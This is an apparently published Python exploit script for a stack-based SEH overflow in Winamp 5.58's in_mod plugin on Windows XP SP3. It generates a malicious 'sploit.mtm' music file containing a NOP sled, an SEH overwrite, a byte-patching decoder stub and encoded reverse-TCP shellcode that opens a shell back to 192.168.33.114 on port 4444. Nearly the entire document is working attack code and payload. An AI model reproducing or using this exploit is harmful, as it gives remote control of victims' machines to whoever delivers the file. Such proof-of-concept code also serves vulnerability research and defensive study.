#!/usr/bin/python
# finally got time to finish what I started...
# Winamp 5.5.8.2985 (in_mod plugin) Stack Overflow (SEH)
# WINDOWS XP SP3 EN Fully Patched
# Bug found by http://www.exploit-db.com/exploits/15248/
# POC and Exploit by @fdiskyou
# e-mail: rui at deniable.org
# This POC was already been released here (without proper shellcode): http://www.exploit-db.com/winamp-5-58-from-dos-to-code-execution/
# We later gave up on SEH and went straight for direct EIP overwrite, yesterday I couldn't sleep and decided to finish cooking this version.
# Further References:
# http://www.exploit-db.com/winamp-exploit-part-2/
# http://www.exploit-db.com/exploits/15287/
# Special thanks to Mighty-D, Ryujin and all the Exploit-DB Dev Team.

header = "\x4D\x54\x4D\x10\x53\x70\x61\x63\x65\x54\x72\x61\x63\x6B\x28\x6B\x6F\x73\x6D\x6F\x73\x69\x73\x29\xE0\x00\x29\x39\x20\xFF\x1F\x00\x40\x0E"
header += "\x04\x0C" * 16
nopsled = "\x90" * 58331

# windows/shell_reverse_tcp LHOST=192.168.33.114 LPORT=4444 (script kiddie unfriendly)
# bad chars: \x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x0a\x0b\x0c\x0d\x0e\x0f
shellcode = ("\x89\xe1\xda\xd7\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4d\x38\x4d\x59\x43\x30"
"\x43\x30\x45\x50\x43\x50\x4d\x59\x4b\x55\x56\x51\x58\x52\x43"
"\x54\x4c\x4b\x50\x52\x50\x30\x4c\x4b\x56\x32\x54\x4c\x4c\x4b"
"\x51\x42\x54\x54\x43\x42\x51\x38\x54\x4f\x58\x37\x51"
"\x5a\x56\x46\x50\x31\x4b\x4f\x56\x51\x49\x50\x4e\x4c\x47\x4c"
"\x43\x51\x43\x4c\x43\x32\x56\x4c\x47\x50\x4f\x31\x58\x4f\x54"
"\x4d\x58\x47\x5a\x42\x5a\x50\x51\x42\x50\x57\x4c\x4b"
"\x51\x42\x54\x50\x4c\x4b\x47\x32\x47\x4c\x45\x51\x4e\x30\x4c"
"\x4b\x47\x30\x43\x48\x4d\x55\x4f\x30\x43\x44\x50\x4a"
"\x4e\x30\x50\x50\x4c\x4b\x50\x48\x54\x58\x4c\x4b\x56\x38\x47"
"\x50\x43\x31\x4e\x33\x4b\x53\x47\x4c\x50\x49\x4c\x4b\x50\x34"
"\x4c\x4b\x43\x31\x49\x46\x50\x31\x4b\x4f\x49\x50\x4e"
"\x4c\x49\x51\x58\x4f\x54\x4d\x43\x31\x49\x57\x47\x48\x4b\x50"
"\x52\x55\x4b\x44\x43\x33\x43\x4d\x4c\x38\x47\x4b\x43\x4d\x47"
"\x54\x54\x35\x4b\x52\x51\x48\x56\x38\x56\x44\x43\x31"
"\x49\x43\x43\x56\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x58\x45"
"\x4c\x45\x51\x58\x53\x4c\x4b\x54\x44\x4c\x4b\x45\x51\x58\x50"
"\x4d\x59\x50\x44\x56\x44\x51\x4b\x51\x4b\x45\x31\x56"
"\x39\x50\x5a\x56\x31\x4b\x4f\x4d\x30\x56\x38\x51\x4f\x50\x5a"
"\x4c\x4b\x54\x52\x5a\x4b\x4d\x56\x51\x4d\x52\x48\x47\x43\x50"
"\x32\x43\x30\x52\x48\x52\x57\x52\x53\x50\x32\x51\x4f"
"\x51\x44\x52\x48\x50\x4c\x54\x37\x47\x56\x54\x47\x4b\x4f\x49"
"\x45\x4e\x58\x4c\x50\x45\x51\x43\x30\x43\x30\x56\x49"
"\x51\x44\x56\x30\x52\x48\x56\x49\x4d\x50\x52\x4b\x43\x30\x4b"
"\x4f\x58\x55\x50\x50\x50\x50\x50\x50\x50\x50\x51\x50\x56\x30"
"\x51\x50\x56\x30\x52\x48\x4b\x5a\x54\x4f\x4b\x50\x4b"
"\x4f\x49\x45\x4b\x39\x58\x47\x43\x58\x4f\x30\x4f\x58\x47\x51"
"\x54\x32\x45\x38\x45\x52\x43\x30\x54\x51\x51\x4c\x4c\x49\x5a"
"\x46\x52\x4a\x52\x30\x51\x46\x45\x38\x4d\x49\x4e\x45"
"\x43\x44\x45\x31\x4b\x4f\x58\x55\x45\x38\x43\x53\x52\x4d\x45"
"\x34\x45\x50\x4b\x39\x5a\x43\x56\x37\x56\x37\x50\x57\x56\x51"
"\x4c\x36\x52\x4a\x50\x59\x51\x46\x5a\x42\x4b\x4d\x45"
"\x36\x4f\x37\x51\x54\x47\x54\x47\x4c\x45\x51\x43\x31\x4c\x4d"
"\x51\x54\x56\x44\x52\x30\x49\x56\x43\x30\x51\x54\x51\x44\x56"
"\x30\x50\x56\x50\x56\x47\x36\x50\x56\x50\x4e\x50\x56"
"\x51\x46\x56\x33\x56\x36\x52\x48\x52\x59\x58\x4c\x47\x4f\x4c"
"\x46\x4b\x4f\x58\x55\x4d\x59\x4b\x50\x50\x4e\x50\x56"
"\x4b\x4f\x56\x50\x43\x58\x45\x58\x4b\x37\x45\x4d\x43\x50\x4b"
"\x4f\x58\x55\x4f\x4b\x4c\x30\x4f\x45\x4e\x42\x56\x36\x52\x48"
"\x4e\x46\x4c\x55\x4f\x4d\x4d\x4d\x4b\x4f\x47\x4c\x43"
"\x36\x43\x4c\x45\x5a\x4d\x50\x4b\x4b\x4d\x30\x43\x45\x43\x35"
"\x4f\x4b\x51\x57\x45\x43\x43\x42\x52\x4f\x43\x5a\x45\x50\x51"
"\x43\x4b\x4f\x58\x55\x45\x5a")

prepare_shellcode = "\x90" * 40
prepare_shellcode += "\x90\x33\xDB"             # xor ebx,ebx
prepare_shellcode += "\x54\x5B"                 # push esp - pop ebx
prepare_shellcode += "\x81\xEB\x17\xCB\xFF\xFF" # sub ebx,-34E9
prepare_shellcode += "\x83\xc3\x3B"             # add ebx,3B
prepare_shellcode += "\x83\xEB\x22"             # sub ebx,22
prepare_shellcode += "\x80\x2B\xDA"             # sub byte ptr ds:[ebx],0da
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xDA"             # sub byte ptr ds:[ebx],0da
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x90" * 6
prepare_shellcode += "\x80\x2B\xC2"             # sub byte ptr ds:[ebx],0c2
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xBE"             # sub byte ptr ds:[ebx],0be
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xC1"             # sub byte ptr ds:[ebx],0c1
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xBF"             # sub byte ptr ds:[ebx],0BF
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xC8"             # sub byte ptr ds:[ebx],0c8
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xB9"             # sub byte ptr ds:[ebx],0B9
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x90" * 4
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xCA"             # sub byte ptr ds:[ebx],0CA
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xD9"             # sub byte ptr ds:[ebx],0D9
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xB7"             # sub byte ptr ds:[ebx],0B7
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xB9"             # sub byte ptr ds:[ebx],0B9
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xC1"             # sub byte ptr ds:[ebx],0c1
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xBF"             # sub byte ptr ds:[ebx],0BF
prepare_shellcode += "\x90" * 4
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xBC"             # sub byte ptr ds:[ebx],0BC
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xD6"             # sub byte ptr ds:[ebx],0D6
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xCA"             # sub byte ptr ds:[ebx],0CA
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xDA"             # sub byte ptr ds:[ebx],0da
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xC4"             # sub byte ptr ds:[ebx],0c4
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x90" * 4
prepare_shellcode += "\x80\x2B\xB6"             # sub byte ptr ds:[ebx],0B6
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xC4"             # sub byte ptr ds:[ebx],0c4
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xBB"             # sub byte ptr ds:[ebx],0BB
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xB7"             # sub byte ptr ds:[ebx],0B7
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xD3"             # sub byte ptr ds:[ebx],0D3
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x90" * 6
prepare_shellcode += "\x80\x2B\xBB"             # sub byte ptr ds:[ebx],0BB
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xD8"             # sub byte ptr ds:[ebx],0D8
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xB7"             # sub byte ptr ds:[ebx],0B7
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xD4"             # sub byte ptr ds:[ebx],0d4
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xBC"             # sub byte ptr ds:[ebx],0BC
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xB4"             # sub byte ptr ds:[ebx],0B4
prepare_shellcode += "\x90" * 6
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xBF"             # sub byte ptr ds:[ebx],0BF
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xD5"             # sub byte ptr ds:[ebx],0D5
prepare_shellcode += "\x83\xc3\x3F"             # add ebx,3F
prepare_shellcode += "\x83\xEB\x16"             # sub ebx,16
prepare_shellcode += "\x80\x2B\xCC"             # sub byte ptr ds:[ebx],0CC
prepare_shellcode += "\x43"                     # inc ebx
prepare_shellcode += "\x80\x2B\xC9"             # sub byte ptr ds:[ebx],0C9
prepare_shellcode += "\x90"*305

nseh = "\xeb\x30\x90\x90"
seh = "\x3f\x28\xd1\x72"     # 0x72D1283F - ppr - msacm32.drv - Windows XP SP3 EN
payload = header + nopsled + nseh + seh + prepare_shellcode + shellcode + "\x90" * 100

file = open("sploit.mtm", "w")
file.write(payload)
file.close()

print "sploit.mtm file generated successfuly"
